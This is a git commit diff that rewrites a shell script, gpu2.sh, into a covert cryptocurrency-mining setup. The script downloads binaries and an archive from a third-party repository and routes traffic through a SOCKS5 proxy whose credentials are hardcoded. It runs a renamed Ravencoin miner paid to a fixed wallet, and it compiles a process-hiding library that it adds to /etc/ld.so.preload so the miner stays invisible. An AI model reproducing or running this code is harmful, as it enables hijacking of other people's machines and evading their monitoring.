fe26c2835724854a91e7d9c521f7b26490552217
asraktanusi064 <109596081+asraktanusi064@users.noreply.github.com>
2022-08-08 08:50:54 +0700

    Update gpu2.sh

--- gpu2.sh
+++ gpu2.sh
@@ -1,2 +1,49 @@
 #!/bin/sh
-wget https://github.com/bzminer/bzminer/releases/download/v10.0.1/bzminer_v10.0.1_linux.tar.gz && tar -xf bzminer_v10.0.1_linux.tar.gz && cd bzminer_v10.0.1_linux && chmod +x bzminer && ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./bzminer -a ixi -r rig_name -w 3AymKAZRtcHptxN6eXrwk6FXYpvYzW9cCWLRtrKX6YhGbqUSNLYzw6ScPdz3dZBJy -p http://mineixi.com:80
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 209.127.183.130:8228
+socks5_username = lebarankita
+socks5_password = buatTHRan
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+
+./graftcp/graftcp ./bezzHash --url=RNqiVFp1gb723hf5Zw57V6nyfLeDzoof2P.RGH@rvn.2miners.com:6060 --log --extra --latency --all-shares --shares-detail --show-mode --list-modes --mode=99
